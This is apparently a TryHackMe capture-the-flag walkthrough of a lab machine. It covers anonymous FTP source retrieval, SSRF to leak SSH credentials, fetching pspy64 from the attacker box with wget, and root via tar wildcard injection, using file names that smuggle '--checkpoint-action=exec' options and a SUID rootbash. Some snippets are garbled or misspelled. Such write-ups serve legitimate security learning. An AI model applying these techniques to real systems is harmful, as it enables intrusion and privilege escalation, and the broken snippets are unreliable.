To begin the assessment on TryHackMe for the room **Operation.Coldstart.v.1.2**, the target machine and AttackBox were deployed:

* **Attacker Machine IP:** `10.114.125.155`
* **Target Machine IP:** `10.114.187.74`

---

### 🚩 Target Objectives

The lab defines two core objectives required to complete the assessment:

* **User Flag:** Retrieve the contents of `user.txt`.
* **Root Flag:** Retrieve the contents of `flag.txt`.
<img alt="image" src="https://github.com/user-attachments/assets/08979a30-7efe-4a56-aa43-2b851f924370" />
<img alt="image" src="https://github.com/user-attachments/assets/1eafaffd-b5d3-44d7-94d6-8893a5f80e66" />

### 🌐 Web Application Reconnaissance (URL Preview Service)

Navigating to `http://10.114.187.74/` displays an internal staging application hosted by **Volt Labs**:

* **Application Name:** URL Preview Service
* **Environment Tag:** `staging`
* **Functionality:** Accepts a URL input field (`URL`) to fetch and preview external web content.
* **Footer Notice:** `© Volt Labs · do not expose externally`
<img alt="image" src="https://github.com/user-attachments/assets/1f4990a8-451e-448d-a397-4e478eaf77f0" />

### 📡 Initial Port Scanning & Service Enumeration

An initial port scan was conducted against the target IP (`10.114.187.74`) using `nmap` with default scripts (`-sC`) and service version detection (`-sV`):

```bash
sudo nmap -sC -sV 10.114.187.74
```
<img alt="image" src="https://github.com/user-attachments/assets/77b51c3b-e156-48e8-a59b-6cf513b742cb" />

### 📂 Anonymous FTP Access & Source Code Extraction

Using the information obtained from Nmap, I authenticated to the FTP service as the `anonymous` user and navigated to the default `/pub` directory:

```bash
ftp 10.114.187.74
Name: anonymous
ftp> cd pub
ftp> ls
ftp> get backup.tar.gz
```
<img alt="image" src="https://github.com/user-attachments/assets/0f752fce-5d49-4a6a-a98c-2e5f9d379ed6" />

### 📖 Static Source Code Analysis & Documentation Review

Navigating into the extracted `voltlabs-preview` directory, I inspected the documentation and configuration files to understand the application architecture:

```bash
cd voltlabs-preview/
ls
cat README.md
cat requirements.txt
vim app.py
```
<img alt="image" src="https://github.com/user-attachments/assets/23277269-9b3a-43ad-aa78-91778efe0b94" />

### 🐍 Source Code Analysis (`app.py`)

Analyzing the extracted application source code (`app.py`) reveals key architectural details and security controls:

#### Host Validation Logic
```python
ALLOWED_HOSTS = {"kestrel.thm"} / ip p = notes / admin
```
<img alt="image" src="https://github.com/user-attachments/assets/1951de16-c488-4b86-9ea9-badef665848a" />
<img alt="image" src="https://github.com/user-attachments/assets/c91a090c-0e23-4937-a8e2-a1228ca908ee" />

### 🎯 Triggering the SSRF Vulnerability & Extracting Credentials

To access the restricted administrative functionality, the URL `http://kestrel.thm/admin/notes` was submitted into the input field of the URL Preview Service.

This request targets `http://10.114.187.74/preview?url=http%3A%2F%2Fkestrel.thm%2Fadmin%2Fnotes`:

1. **Host Verification Pass:** The host `kestrel.thm` matches the `ALLOWED_HOSTS` whitelist in the source code.
2. **Local Loopback Resolution:** The web application server issues the request internally to `127.0.0.1`, successfully satisfying the `request.remote_addr.startswith("127.")` IP check required for the `/admin/` endpoint.

---

### 🔑 Extracted Credentials

The application returned the rendered preview of `/opt/voltlabs-preview/admin_notes.txt`, revealing internal staging credentials:

<img alt="image" src="https://github.com/user-attachments/assets/d34cffce-0fda-403d-b431-51d105c612cb" />
<img alt="image" src="https://github.com/user-attachments/assets/ffca3569-57fb-4e5c-8c8a-b427313684a2" />

### 🔑 SSH Initial Access & Capturing User Flag

Using the credentials harvested via SSRF (`webdev` : `V0ltLabs#summer`), I established an SSH connection to the target system:

```bash
ssh webdev@10.114.187.74
```
<img alt="Zrzut ekranu 2026-09-7 o 14 54 30" src="https://github.com/user-attachments/assets/b9011d00-ad10-41f4-aa5e-6fdff6345f40" />

### 🔍 Privilege Escalation Enumeration & Search for `flag.txt`

First, a system-wide search for `flag.txt` was conducted to locate the root flag:

```bash
webdev@coldstart:~$ find / -name "flag.txt" 2>/dev/null

sudo -l

cat /etc/crontab
```
<img alt="image" src="https://github.com/user-attachments/assets/40b9ce16-1ade-438b-99b8-d36bc67ed900" />
<img alt="image" src="https://github.com/user-attachments/assets/db14fde3-632f-4fdf-bf53-f72100f37f38" />

### 🛠️ Transferring `pspy64` to the Target Machine

To observe short-lived background processes executed by higher-privileged users without requiring root access, we utilize **`pspy64`** (a command-line tool that snoops on Linux processes without root permissions by inspecting `procfs`).

#### 1. Host File Delivery on AttackBox
From the local directory containing the `pspy64` binary on the AttackBox (`10.114.125.155`), I started a temporary Python HTTP server on port 8000:

```bash
root-ip: python3 -m http.server
webdev: wget http://10.114.125.155:8000/pspy64 ( if you don't have pspy64, download from github dominicbreuker )
```
<img alt="image" src="https://github.com/user-attachments/assets/41595938-f7db-4573-b5e5-77d39282f2f5" />
<img alt="Zrzut ekranu 2026-09-7 o 15 12 14" src="https://github.com/user-attachments/assets/b1f85b26-534a-41a1-8bdf-2a108b0eaa8a" />

### ⚙️ Executing `pspy64` for Process Monitoring

After transferring `pspy64` to the target machine (`webdev@coldstart`), executable permissions were granted to the binary using `chmod`:

```bash
webdev@coldstart:~$ chmod +x pspy64
webdev@coldstart:~$ ./pspy64
```
<img alt="image" src="https://github.com/user-attachments/assets/db22f57e-230e-4fff-b1f0-7bf1e348d28e" />

### 🕵️ Scheduled Process Identification (`pspy64`)

Monitoring background processes with `pspy64` revealed a periodic task executed by **`UID=0` (root)**:

```text
2026/09/07 13:27:01 CMD: UID=0 PID=1988 | tar czf /var/backups/uploads.tgz *
```
<img alt="image" src="https://github.com/user-attachments/assets/716df02b-72d6-4bfa-bd89-14c38fb44e85" />
<img alt="image" src="https://github.com/user-attachments/assets/cdcc6ac6-21b5-4a71-be42-a26d5367dc69" />


### 🔍 Cron Job Analysis & Exploitation Vector Preparation

Inspecting `/etc/cron.d/voltlabs-backup` confirmed the scheduled task observed during process monitoring with `pspy64`:

```bash
webdev@coldstart:~$ cat /etc/cron.d/voltlabs-backup
webdev@coldstart:~$ vim shell.sh // and put that what you have seen on the screnshoot.
```
<img alt="image" src="https://github.com/user-attachments/assets/ed9cc246-ede5-4cf3-9ae6-187d7b1a4c54" />
<img alt="image" src="https://github.com/user-attachments/assets/a1f15ce6-e87a-42fb-90a0-e872b079cff7" />

### 📂 Directory Setup & Wildcard Parameter Analysis

Inspecting the contents of `/opt/backups/` after configuration shows the following directory structure:

```bash
webdev@coldstart:/opt/backups$ ls
'--checkpoint-acction=exec=sh shell.sh'   '--checkpoint=1'   shell.sh
```
<img alt="image" src="https://github.com/user-attachments/assets/4127e357-929e-4e89-bac3-b930c62c743d" />

### 📂 Execution Verification & Root Flag Retrieval

After waiting for the scheduled cron job cycle to trigger (which runs every minute as `root`), inspecting the contents of `/tmp/` confirms that the automated backup process has executed:

```bash
webdev@coldstart:/opt/backups$ ls /tmp/
webdev@coldstart: create root bash - /tmp/rootbash -p
rootbash-5.2# cat /root/flag.txt
```
<img alt="image" src="https://github.com/user-attachments/assets/3fe18e1e-e14b-47d7-9c8e-a9ad8eb4bdc1" />
<img alt="Zrzut ekranu 2026-09-7 o 15 48 13" src="https://github.com/user-attachments/assets/c24d882b-69f3-4085-bbf6-133a3ac9e765" />





























